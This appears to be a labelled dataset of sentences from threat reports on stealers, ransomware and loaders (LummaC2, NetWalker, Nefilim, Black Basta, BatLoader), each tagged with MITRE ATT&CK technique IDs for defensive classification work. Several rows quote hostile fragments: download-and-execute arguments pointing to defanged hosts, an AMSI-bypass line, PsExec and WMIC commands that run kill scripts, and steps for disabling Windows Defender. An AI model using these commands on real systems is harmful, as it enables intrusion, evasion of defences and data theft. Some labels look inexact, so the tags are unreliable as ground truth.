This malware can exfiltrate files and extract data from specific applications.,T1005
"This stealer may acquire browsing histories, Internet cookies, usernames/passwords, personally identifiable details, credit card numbers, and other highly sensitive information from browsers.","T1005, T1078"
"Since the sample we obtained is a PE file, when we run it after the appropriate environment is prepared and watch its mobility, it continues to run under the name “tmp.exe” by unpacking itself to the “C:\Users\admin\AppData\Local\Temp\” file path.",T1036.005
"Process Name Command Line tmp.exe C:\Users\admin\AppData\Local\Temp\tmp.exe Behavior Activities: tmp.exe Infostealers often target stored browser data, which can include saved credentials etc.","T1005, T1078, T1112"
Registry Key Sets: HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable 1 HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer %HTTP_PROXY%:8080 Reads browser cookies and saves this path: C:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\ymgarh1v.defaul t\cookies.sqlite Connects to the server without a hostname.,T1112
"After the connection to the address is established, it transmits information as a zip file.",T1041
"Strings have been searched, but since there is too much obfuscated information, no tangible results have been found.",T1027
"The stealer also targets crypto wallets such as Binance, Electrum, and Ethereum and collects sensitive information from the victim’s machine.",T1005
"The stealer has many obfuscated strings that are being covered by a random string, “edx765“, to evade detection.",T1027
"Upon execution, the stealer passes the obfuscated string to a function that strips the arbitrary string and delivers the original string.","T1027, T1140"
"LummaC2 stealer sends this information to its C2 server, as shown below.",T1041
"Making a ‘POST’ request, tmp.exe is trying to pass information.",T1071.001
This means that the C2 is transmitted as a zip file during the POST request.,T1041
"Content-Disposition: form-data; name=”hwid” {78494464-3fdf-11ed-8279-806e6f6e6963} Content-Disposition: form-data; name=”pid” 1 Content-Disposition: form-data; name=”lid” xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx When we examine the contents of the zip file viewed from the PCAP file, it collects information, primarily system information.",T1082
The collected data is transferred to the C2 server as a zip file.,T1041
We have obtained different zip files because Lumma Stealer sent multiple POST requests to the “c2/sock” address.,T1071.001
"In conclusion, Lumma Stealer collects cookie information, search histories, and key inputs from browsers and transfers them to the C2 address.","T1041, T1005"
The list of all the information it tries to collect inside of the “Web Data” SQLite file is given in the last image.,T1005
We accessed C2 while visiting port 80. (VirusTotal Graph: Collection),T1071.001
"Shodan Result Communication Addresses Requests 195[.]123[.]226[.]91 POST /c2sock: multipart/form-data;boundary=оaj195iak20ka99441aj1 144[.]76[.]173[.]247 GET/login LummaC2 behaves like other stealer-type malware, which can take away system and sensitive data from the victim’s machine.","T1005, T1082"
"Step 1 – Once the victim reaches the page via phishing email or SMS text, they are instructed to click “Confirm” to view a message from “Express.”",T1204.002
"The user is also asked to permit push notifications in the browser, which allows the attacker to push malicious ads, as we will demonstrate later in this analysis.",T1204.002
"It uses some tricks to avoid detection, such as a new defence evasion technique, known as reflective DLL loading, to inject a DLL from memory.",T1055
This file is extracted to memory and decrypted using the RC4 algorithm with a hard-coded key in the resource.,T1140
"Before 12 March 2020, NetWalker used the email contact process between its support operation and the victims to proceed with payment and send the decryption program.",T1140
"NetWalker resource from wwllww.exe Once decrypted, the configuration file reveals several parameters, allowing us to understand how it works (how it constitutes the ransom note, the number of threads allocated for encryption, etc.): mpk Public key mode Encryption mode thr Allocated threads for encryption process spsz Encryption chunk namesz Name length idsz ID length crmask .mailto[email].{ID} mail Contact mail lfile Ransom Note name lend B64 encoded ransom note white Encryption whitelist kill Processes, tasks, service names to terminate unlocker Decryption exclusion list NetWalker Resource Analysis (Post-March 2020)",T1140
"The latter can, for example, be a regular Bitmap (open matrix image format used by Windows) that can be used by malware to execute code or as a payload dropper.",T1027
The image’s pixels are an actual binary representation of the payload.,T1027
"This process can be summarized as Exe -> Resources -> BMP with embedded data in pixels fetched and decrypted by, e.g. a DLL -> Payload), etc.","T1027, T1140"
The malware sample used for this blog post has the same information: Name c21ecd18f0bbb28112240013ad42dad5c01d20927791239ada5b 61e1c6f5f010 Size 70656 bytes File-Type EXE SHA 256 c21ecd18f0bbb28112240013ad42dad5c01d20927791239ada5b 61e1c6f5f010 Compile time 2 May 2020,T1027
The unpacked malware is a binary file of 32 bits that can be found as an EXE file.,T1027
The file extracted in memory is decrypted using the RC4 algorithm with a hardcoded key in the resource.,T1140
The size of the hardcoded key to decrypt the configuration file.,T1140
Variable size -> the hardcoded key to decrypt the configuration file.,T1140
Variable size -> the configuration file encrypted.,T1027
"Get configuration file and decrypt it If the malware fails to get the configuration file, it will terminate itself.",T1140
"After getting the configuration file, the malware will parse it and save the fields in memory and write in the registry information to encrypt the files in the machine.",T1112
"The malware will try first to write in the registry-hive “HKEY_LOCAL_MACHINE” but if it cannot create it, it will use the registry-hive “HKEY_CURRENT_USER”: Figure 12.",T1112
"Write in the registry After the writing in the registry has been completed, it will get some privileges using a token as SE_DEBUG_PRIVILEGE and SE_IMPERSONATE_PRIVILEGE: Figure 13.",T1112
"Get some special privileges in the token Later, the malware creates three threads, one to get information about the machine, such as the operating system version, one to get processes and the last one to get services in the system.","T1057, T1082"
"Crypt the files After all these steps have been completed, it will create the ransom note on the desktop using the functions “SHGetFolderPathlW” and “CreateFileW”.",T1106
"Subsequently, it will write the ransom note from the memory into a new file with the function “WriteFile”.",T1106
The batch script will delete the malware sample with its path using the command “del” and finally delete the bat file with the command “del %0%”.,"T1059.003, T1070.004"
"Of course, as the malware uses the “del” command without destroying itself before the deletion, it can be recovered with some forensic tools with luck (the same can also be said for the bat file).",T1070.004
This way the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers: Figure 17.,T1070.004
Decryptor When a NetWalker victim goes through technical support (see an example of this below) and pays the ransom demanded by the group they will be able to download the decryptor to clean up their environment.,"T1105, T1140"
"Conversation with NetWalker operators The download is done directly from the NetWalker Tor site, where the payment page switches to a download page certifying that the payment was made and received: Figure 19.",T1105
Decryptor download The decryptor is delivered in a zip archive containing the decryptor executable and a note explaining how to run the program correctly: Figure 20.,T1140
"Decryptor execution At the end of the decryption process, the program indicates the number of decrypted files, deletes the ransom note if the user has checked that option, and terminates, leaving the user to resume their work peacefully: Figure 22.","T1140, T1070.004"
Decryptor has finished the decryption process The decryptor program appears unique and is linked to one victim specifically.,T1140
"In our example, it only decrypts the files belonging to the victim who made the payment from the user key specified in the ransom note.",T1140
PsExec Native API (T1106): Use Windows API functions to inject DLL Windows Management Instrumentation (T1047) Persistence Registry Run Key (T1547.001):,"T1106, T1055"
"Place a value on RunOnce key Modify Registry key (T1112): Create its own registry key in \SOFTWARE\<uniquename> Privilege Escalation Exploitation for Privilege Escalation (T1068): CVE-2020-0796, CVE-2019-1458, CVE-2017-0213, CVE-2015-1701 Process Injection (T1055.001): Reflective DLL Injection Defense Evasion Disabling Security Tools (T1562.001): ESET AV Remover, Trend Micro’s Security Agent Uninstall Tool, Microsoft Security Client Uninstall Process Injection (T1055.001): Reflective DLL Injection Deobfuscate/Decode Files or Information (T1140) Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption Credential Access Credential Dumping (T1003): Mimikatz, Mimidogz, Mimikittenz, Windows Credentials Editor, Pwdump, LaZagne Brute Force (T1110.001): NLBrute Discovery Network Service Scanning (T1046): SoftPerfect Network Scanner Security Software Discovery (T1518.001)","T1027, T1547.001, T1112"
The investigation revealed that the threat actor launched credential stuffing attacks against high-risk accounts that didn’t have multi-factor authentication (MFA) enabled and leveraged the unsecured administrator accounts to gain initial access.,T1110
"These IP addresses were identified as being involved in malicious activities, such as performing password spray, botnet C2, and may indicate a compromised account.",T1110
Activity from a password-spray associated IP address.,T1110
This alert is generated when a successful sign-in from an IP address that had been identified as participating in password spray was observed.,T1110
"When ransoms are not paid, they have been known to shame victims by posting their data on the dark web. Technical Details Initial access Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by brute-forcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices.","T1190, T1021.001, T1110"
Nefilim places a heavy emphasis on Remote Desktop Protocols.,T1021.001
"It has been also seen that Nefilim uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass.",T1003.001
"It uses bat files to stop services/kill processes as shown in below image, and the stolen credentials are used to reach high-value machines like servers.","T1059.003, T1078"
-h -r mstdc -s -accepteula -nobanner c:\windows\teamp\Kill.bat Start psexec.exe -accepteula \destinationip -u domain\username\ -p password reg add HKLM\software\Microsoft\Windows\CurrentVersion\Policies\System /v,T1112
0 /F WMIC /node: \destinationip /username:”domain\username” /password:”password” process CALL CREATE “cmd.exe /c,T1047
"/password:”password” process CALL CREATE “cmd.exe /c C:\WINDOWS\TEMP\kill.bat"" Below images shows A batch file to stop services/kill processes Fig.",T1059.003
It also drops and installs MegaSync to exfiltrate data.,T1105
It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks since the last system reboot.,T1106
"6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API ""C:\Windows\System32\cmd.exe"" /c","T1027, T1106"
"The file is actually a link (LNK) file that launches the legitimate script (C:\Windows\System32\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments.",T1059.003
The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\W_\*2\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.,"T1105, T1059.003"
"The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation.",T1105
Note.txt containing fake “QUARTERLY TAX PAYMENTS FOR 2022” data onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender.,T1562.001
".GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from ""%windir%\system32\amsi.dll"" to ""C:\IDontExist.dll"".",T1562.001
"The PowerShell script then performs the following actions to alter Windows Defender settings: Adds the following exclusions to Windows DefenderExtensions: .bat, .ppam, .xls, .docx, .bat, .exe, .vbs, .js",T1562.001
"File paths: C:\, D:\, E:\ Processes: explorer.exe, kernel32.dll, aspnet_compiler.exe, cvtres.exe, CasPol.exe, csc.exe, Msbuild.exe, ilasm.exe, InstallUtil.exe, jsc.exe, Calc.exe, powershell.exe, rundll32.exe, conhost.exe, Cscript.exe, mshta.exe, cmd.exe, DefenderisasuckingAntivirus, wscript.exe Allows known Windows Defender Threat IDs to execute Disables Windows Defender Attack Surface Reduction (ASR) rules Disables the following Windows Defender features:Intrusion Prevention System IO AV Protection (does not scan downloaded files and attachments)",T1562.001
Realtime monitoring Script scanning Controlled folder access protection PUA protection Scheduled scan Sets Network Protection to audit mode in Windows Defender (allows users to visit known malicious sites but logs them in the event log),T1562.001
"Disables MAPS (Microsoft Active Protection Service) reporting Never submits samples to Microsoft Allows severe/high/moderate/low-level threats to execute Disables the ""administrator in Admin Approval Mode"" user type (disables UAC prompts) Stops the WinDefend service (Windows Defender) Disables the startup of the WinDefend service Deletes the WinDefend service Creates a user named ""System32"" with the password “123” (no quotes) Adds the System32 user to both the ""administrators"" group and the ""Remote Desktop Users"" group Stops the Microsoft Defender Antivirus Network Inspection Service (WdNisSvc) Turns off Windows Firewall The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1.","T1562.001, T1055"
"As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them.",T1204.002
Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”.,T1105
The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”.,T1105
"XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC).","T1113, T1056.001"
"Based on our experience, they were likely lured via malicious links in spam emails.",T1204.002
"Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.",T1204.002
"However, it’s a link (shortcut) file, as seen in Figure 4.",T1204.002
Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1).,"T1105, T1204.002"
The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code.,T1027
The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file:,"T1547.001, T1564.001"
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\iXqrVo =,T1547.001
"This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs.",T1564.001
The script then sleeps five seconds before downloading and executing whatever has been downloaded.,T1105
TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07).,T1105
"no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: C:\ProgramData\Document\py.ps1 C:\ProgramData\schtasks\Microsoft.bat C:\ProgramData\Document\x.ps1 The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1.",T1105
The link file downloads and executes hxxp://[redacted].67[.]12:222/xa[.]hta xa[.]hta downloads and executes hxxp://[redacted].67[.]12:222/qDxcmqPPmI[.]wsf qDxcmqPPmI.wsf was not available at the time of the investigation.,T1105
qDxcmqPPmI[.]wsf downloads and executes hxxp://[redacted].67[.]12:222/no[.]txt no[.]txt downloads and executes hxxp://[redacted].67[.]12:222/j[.]png j.png creates py.ps1 and x.ps1.,T1105
"But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain.",T1204.002
It also supports the command line argument -forcepath that is used to encrypt files in a specified directory.,T1059.003
"Then it will iterate through the entire file system, encrypting files with a file extension of .basta.",T1083
"It adds a custom icon to the registry, corresponding to the .basta icon, which is shown in Figure 3.",T1112
Spear phishing Attachment Victims receive spear phishing emails with attached malicious zip files - typically password protected.,T1566.001
System Services: Service Execution Black Basta has installed and used PsExec to execute payloads on remote hosts.,T1569.002
PowerShell Black Basta has encoded PowerShell scripts to download additional scripts.,"T1027, T1105"
Windows Service Creates benign-looking services for the ransomware binary. T1574.001.,T1543.003
Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1574.001.,T1484.001
Windows Service Creates benign-looking services for the ransomware binary.,T1543.003
Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1218.010.,T1484.001
Indicator Removal on Host: File Deletion Attempts to delete malicious batch files.,T1070.004
Modify Registry Black Basta makes modifications to the Registry.,T1112
"Impair Defenses: Disable or Modify Tools Disables Windows Defender with batch scripts, such as d.bat or defof.bat.","T1562.001, T1059.003"
"Impair Defenses: Disable or Modify System Firewall Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP.",T1059.003
Credentials from Password Stores Black Basta uses Mimikatz to dump passwords.,T1003.001
System Network Configuration Discovery Lists internal IP addresses to target in C:\Windows\pc_list.txt – typically found on the Domain Controller. T1082.,T1016
System Information Discovery Uses GetComputerName to query the computer name.,T1082
Remote Desktop Protocol Black Basta has used RDP for lateral movement.,T1021.001
Remote Access Software Black Basta has installed and used legitimate tools such as TeamViewer and AnyConnect on targeted systems. T1573.,T1219
Data Encrypted for Impact Black Basta modifies the Desktop background by adding a .jpg in C:\Temp and creating a registry key HKCU\Control Panel\Desktop.,T1112
Additionally modifies the registry to change the icon of encrypted files.,T1112
"Four out of every five Fortune 500 companies, for example, use Microsoft 365 services [1].",T1078
Malicious actors typically gain entry to organizations’ Microsoft 365 environments by abusing either stolen account credentials or stolen session cookies,T1078
Darktrace regularly observes malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.,T1078
"‘PerfectData Software’ Activity Darktrace observed variations of the following pattern of activity relating to an application named ‘PerfectData Software’ within its customer base:Actor signs in to a Microsoft 365 account from an endpoint associated with a Virtual Private Server (VPS) or Virtual Private Network (VPN) serviceActor registers an application called 'PerfectData Software' with Azure AD, and then grants permissions to the applicationActor accesses mailbox data and creates inbox rule In two separate incidents, malicious actors were observed conducting their activities from endpoints associated with VPN services (HideMyAss (HMA) VPN and Surfshark VPN, respectively) and from endpoints within the Autonomous System AS396073 MAJESTIC-HOSTING-01.",T1078
"In March 2023, Darktrace observed a malicious actor signing in to a Microsoft 365 account from a Kuwait-based IP address within the Autonomous System, AS198605 AVAST Software s.r.o.",T1078
"The emails included an attachment named ‘Credit Transfer Copy.html’, which contained a suspicious link.",T1566.001
Figure 1: Advanced Search logs depicting the steps which the actor took after logging in to a user’s Microsoft 365 account.,T1078
"In a separate case also observed by Darktrace in March 2023, a malicious actor was observed signing in to a Microsoft 365 account from an endpoint within the Autonomous System, AS397086 LAYER-HOST-HOUSTON.",T1078
It is also possible the application referenced in the incidents is a spoof of the legitimate ‘PerfectData’ software designed to masquerade a malicious application as legitimate.,T1036.005
Darktrace CoverageCases of ‘PerfectData Software’ activity chains detected by Darktrace typically began with an actor signing into an internal user’s Microsoft 365 account from a VPN or VPS-related endpoint.,T1078
"These login events, along with the suspicious email and/or brute-force activity which preceded them, caused the following DETECT models to breach:SaaS / Access / Unusual External Source for SaaS Credential UseSaaS / Access / Suspicious Login AttemptSaaS / Compromise / Login From Rare Following Suspicious Login Attempt(s)SaaS / Email Nexus / Unusual Location for SaaS and Email ActivitySubsequent activities, including inbox rule creations, registration of applications in Azure AD, and mass-mailing activity, resulted in breaches of the following DETECT models.",T1110
"The loader drops certain malware if certain conditions of the infected host are met (e.g., ARP table, domain check).The last BatLoader campaign performs the antivirus checks and is capable of modifying Windows UAC prompt, disabling Windows Defender notifications, disabling Task Manager, disabling command prompt, preventing users from accessing Windows registry tools, disabling the Run command, and modifying the display timeout.eSentire TRU assesses with high confidence that BatLoader will remain active in the wild in 2023 and potentially serve as a first stage payload to deliver other malware.","T1562.001, T1518.001"
The malicious script resides under AI_DATA_SETTER action name and contains the instructions to download the malicious update.bat file from the C2 domain and place it under AppData\Roaming folder (Figure 8).,T1105
Figure 9: Contents of update.bat The requestadmin.bat is responsible for performing antivirus tampering – adding %APPDATA% and %USERPROFILE%\ paths to Windows Defender exclusion to prevent Defender from scanning the mentioned paths.,T1562.001
The batch file was executed via nircmd.exe which was also downloaded from the C2; the utility allows the batch file to run in the background without displaying the user interface.,T1059.003
"Besides excluding the paths, the batch file also retrieves and executes the runanddelete.bat and scripttodo.ps1 scripts from the C2 via a native PowerShell command Invoke-WebRequest (Figure 10).","T1105, T1059.003"
"Figure 11: GnuPg installation Further down, the script enumerates the current domain that the user is logged into, the username, and obtains all entries within the IPs starting with 192., 10., and .172 in the ARP cache table.","T1033, T1016"
"Once it completes that task, it then checks the amount of IPs found in the ARP table and completes a sum operation.",T1016
"If the number of IPs is greater than 2, the domain is not in WORKGROUP and does not contain the username, which satisfies all the conditions set in the script, then the full set of malware is retrieved from C2 (Figure 12).",T1105
"The requests to the C2 server are performed in the following format: https://<C2 Server>/g5i0nq/index/d2ef590c0310838490561a205469713d/?servername=msi&arp=""+ $IP_count + ""&domain="" + $UserDomain + ""&hostname="" + $UserPCname https://<C2 Server>/g5i0nq/index/fa0a24aafe050500595b1df4153a17fb/?servername=msi&arp=""+ $IP_count + ""&domain="" + $UserDomain + ""&hostname="" + $UserPCname https://<C2 Server>/g5i0nq/index/i850c923db452d4556a2c46125e7b6f2/?servername=msi&arp=""+ $IP_count + ""&domain="" + $UserDomain + ""&hostname="" + $UserPCname https://<C2 Server>/g5i0nq/index/b5e6ec2584da24e2401f9bc14a08dedf/?servername=msi&arp=""+ $IP_count + ""&domain="" + $UserDomain + ""&hostname="" + $UserPCname Figure 12: Enumerating the host and retrieving malware from C2 based on the conditions If the mentioned conditions are not satisfied, the script retrieves the GPG-encrypted files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer)","T1027, T1105"
"If all the conditions are met, the script retrieves the following files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer)d655.dll.gpg (encrypted Cobalt Strike)f827.exe.gpg (encrypted Syncro RMM)shutdowni.bat We were unable to retrieve the shutdowni.bat file but we believe the script might have been deployed to restart the host.",T1140
The GPG decryption routine was borrowed from the script hosted on GitHub (Figure 13).,T1140
The script looks for files ending with gpg in %APPDATA% folder and decrypts them using the password 105b.,T1140
"Figure 13: GPG decryption snippet Moreover, the scripttodo.ps1 recursively removes the implementation of Windows Defender IOfficeAntiVirus under HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}.","T1562.001, T1140, T1112"
It then adds the extensions such as exe and DLL as exclusions to Windows Defender.,T1562.001
"The batch file is responsible for running a malicious executable d2ef5.exe with administrator privileges by creating a VBS script getadmin.vbs under %TEMP% folder to run the binary, but first the user would get an alert prompt from User Account Control (UAC) to allow the program to make changes.",T1059.003
"Upon execution, ISFB creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.",T1547.001
The command execution example: cmd /c start C:\Users\<username>\VirtualStop.lnk,T1059.003
"-ep unrestricted -file C:\Users\<username>\CollectMirrow.ps1 The CollectMirror.ps1 script contains the PowerShell one-liner (Figure 15) that pulls the written data from the registry under HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\<registry_value>>, specifically the TestMouse value (Figure 16).",T1012
"Figure 15: Contents of CollectMirror.ps1 Figure 16: Contents of TestMouse registry value The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state, this can be achieved by invoking SleepEx as shown in Figure 17.","T1106, T1055"
We have observed ISFB injecting itself into a running explorer.exe process.,T1055
The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5).,T1027
Figure 17: Process injection We have observed ISFB injecting itself into a running explorer.exe process.,T1055
The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5).,T1027
The payload locates the BSS section which is where the encrypted strings reside within the function shown in Figure 18 (the hex string 81 38 2E 62 73 73 contains ‘bss’).,T1027
Figure 18: Payload locating the .bss section,T1027
The data stored in the BSS section is encoded as shown in Figure 19. Figure 19: Snipped of the encoded data in the BSS section,"T1027, T1140"
"The decryption function is shown below, the decryption function can be represented as the following pseudocode: Figure 20: Decryption function pseudocode The decryption function takes 4 bytes of the encrypted data in BSS at a time and converts them into an integer, then subtracts the key from the index value and adds to the DWORD value which is 4 bytes.","T1027, T1140"
The decryption function is thoroughly described by 0verfl0w (Daniel Bunce) here.,T1140
Part of the key is derived from the division operations from the value retrieved from API call GetSystemTimeAsFileTime (retrieving system time).,T1106
Applying the key to the decryption function (Figure 22) and part of the key derived from system time (which is 19) gave us the decrypted data (Figure 23).,T1140
Figure 21: Decompiled decryption function Figure 22: Decryption function in Python Figure 23: Decrypted strings The second decompressed data blob contains the following:,T1140
"The third blob contains the wordlist values shown below: ['list', 'stop', 'computer', 'desktop', 'system', 'service', 'start', 'game', 'stop', 'operation', 'black', 'line', 'white', 'mode', 'link', 'urls', 'text', 'name', 'document', 'type', 'folder', 'mouse', 'file', 'paper', 'mark', 'check', 'mask', 'level', 'memory', 'chip', 'time', 'reply', 'date', 'mirrow', 'settings', 'collect', 'options', 'value', 'manager', 'page', 'control', 'thread', 'operator', 'byte', 'char', 'return', 'device', 'driver', 'tool', 'sheet', 'util', 'book', 'class', 'window', 'handler', 'pack', 'virtual', 'test', 'active', 'collision', 'process', 'make', 'local', 'core'] These words are used to build the registry value names.",T1112
Another interesting feature of the ISFB is that it stores three embedded binaries within the unpacked payload.,T1027
The binaries are compressed using APLib compression algorithm.,T1027
"The decompression function is shown in Figure 24. Figure 24: APLib decompression function To be able to locate the embedded compressed binaries, we need to find the structure of the ISFB payload where it stores the configuration.","T1027, T1140"
"The configuration contains the payload marker or header, XOR key, CRC32 hash, the offset, and the size of each compressed binary (Figure 25).",T1027
Figure 26: Snippet of the compressed data We wrote a Python script to extract the compressed data and decompress them (Figure 27).,T1140
Figure 27: Python script to extract and decompress data blobs Figure 28: RSA public key blob ISFB also stores the configuration within the function that parses the payload header (Figure 29).,T1140
"0x11271c7f – timer 0x48295783 – timer 0x584e5925 – botnet 0x556aed8f – server 0x4fa8693e – key 0xd0665bf6 – domains 0x54432e74– directory 0xbbb5c71d – extension The traffic beaconing contains the following pattern that will be encrypted with the AES key extracted from the compressed blob: soft=%u&version=%u&user==%08x%08x%08x%08x &server=50&id=10101&crc=61f03b3&uptime=102696&action=%08x&dns=%s&whoami=%s&os=%s soft, version – version of the payload user – the value calculated from applying the RNG (Random Number Generator) algorithm, using the username, computer name, XOR operations, and cpuid call.","T1573.001, T1033, T1082"
"server – server ID id – botnet ID uptime – is the value based on the API calls QueryPerformanceFrequency and QueryPerformanceCounter dns – computer name os – OS version and system type The example of the encrypted with AES-128 beacon, replacing + with _2B and / with _2F, the / are also being added: /uploaded/V1jd62QM3JcPMZGTpdjl2I/mEcoduKcJlNZo/S1Tq0KYy/M2ZEZFPG3iasm8TVeZ5oYf7/m_2FHfl318/E2HneynLJsT2KcKW6/MBeMivC1RFEh/TAL8bLaLD_2/B1Hg1OTg4XQwlG/IJbZJIe0rxQ0SYwzWgYte/TfzvWXXywf9HHwRL/2ZSv_2BcgktHGaZ/hRo7dwwYV3D39_2Bmc/JmEz3Z359/UhGcxj4s_2F80Krry3Kf/tI6i_2BxIXB2d6WASfJ/NCIpYT61pYgL53jx8SghJH/pQnAADp6racXs/VdB_2FRy/o74GaLVJG9neXweATdYNR/5.pct Some interesting strings found: /data.php?version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s \Software\Microsoft\Windows\CurrentVersion SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings %","T1106, T1573.001, T1082"
Cmd %s processed: %u Cmd %u parsing: %u cmd /C,T1059.003
"""%s> %s1"" wmic computersystem get domain |more systeminfo.exe tasklist.exe /SVC > driverquery.exe > reg.exe query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s >","T1047, T1012"
USERPROFILE%\AppData\Roaming\Thunderbird\Profiles\*.default \logins.json /C pause dll cache2\entries\*.*,T1059.003
cmd /c start %,T1059.003
"We still see some remanences from the Ursnif DreamBot in ISFB v2 (file://c:\test\tor64.dll), which might suggest that the Tor communication capability is still possible.",T1090
"The stealer then collects the credentials, host information, files, and screenshot and sends it over as a ZIP archive in a base64-encoded format as shown in Figure 30.","T1005, T1113"
"Figure 30: Vidar exfiltrating stolen data We are in the processing of completing a technical analysis of Vidar Stealer, which will be our next blog.",T1219
Syncro RMM is a Remote Monitoring and Management tool used to control and manage devices remotely.,T1219
"In the hands of a malicious actor, this tool can be used as a persistence mechanism and remote accessing.",T1219
"SystemBC RAT also known as “socks5 backconnect system” (MD5: 8ea797eb1796df20d4bdcadf0264ad6c) is a malware that leverages SOCKS5 proxies to hide malicious traffic, it also has the capability of sending additional payloads to the hosts (Figure 31).","T1095, T1105, T1090"
Figure 31: Leaked SystemBC on a hacking forum The RAT creates the mutex “wow64” with the “start” as an argument (“start” will also be used as an argument for the scheduled task command).,T1053.005
"If the value is not equal to 1000, it proceeds with scheduled task creation, the task name is “wow64.exe”.",T1053.005
The command to run the scheduled task every 2 minutes is start.,T1053.005
"Figure 32: Function responsible for calling C2, task scheduling, and mutex creation SystemBC is capable of executing scripts and commands retrieved from C2 such as ps1, bat, vbs, and exe (Figure 33).","T1105, T1053.005"
"Instead, the installer pushes “avolkov.exe” binary to the infected machine and creates the registry key containing the path of the dropped binary which is AppData/Local/ SetupProject1 (Figure 34).",T1112
"Figure 34: Malicious MSI installer creating the registry key and dropping the binary file under AppData/Local/SetupProject1 The avolkov.exe binary (MD5: d41e0fee0ec6c2e3da56a6dcf53607da) utilizes libcurl 7.85.0 which enables the data transfer with URL syntax for protocols such as HTTP/HTTPS, FTP, DICT, SMTP, IMAP, POP3, LDAP, acting as a potential backdoor and loader.","T1071.001, T1112"
The batch script is responsible for pulling additional BatLoader payloads and scripts from C2 such as: requestadmin.bat nircmd.exeuser.ps1checkav.ps1scripttodo.ps1 Figure 35: Contents of newtest.bat The requestadmin.bat (Figure 36) retrieved from the second campaign is different compared to the first campaign.,"T1105, T1059.003"
The threat actor(s) made sure to add more paths and folders to Windows Defender exclusion including %TEMP% and C:\Windows\* as well as adding .ps1,T1562.001
(PowerShell) extension to the exclusion list.,T1562.001
"We observed that the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts: Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout (monitor powers off after 30 minutes) and sleep mode (on AC/battery power – goes to sleep after 3000 minutes (50 hours)).",T1562.001
